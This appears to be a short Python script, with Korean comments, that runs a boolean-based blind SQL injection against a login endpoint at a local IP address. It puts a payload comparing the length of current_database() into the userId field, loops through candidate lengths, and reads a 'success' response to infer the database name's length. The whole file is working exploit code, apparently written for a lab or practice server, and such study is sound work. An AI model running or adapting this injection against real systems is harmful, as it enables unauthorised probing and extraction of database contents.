import requests
result = 0
for i in range(0,10):
    id = f"'or length(current_database())={i}--"
    # 서버 주소와 포트에 맞게 수정
    url = 'http://192.168.64.1:1204/users/signin'
    data = {
        'userId': id,
        'password': 'hello1'
    }

    try:
        response = requests.post(url, json=data)
        if('success' in response.text):
            result = i
            break

    except Exception as e:
        print('요청 중 오류 발생:', e)
print("db이름 길이 : ",result)
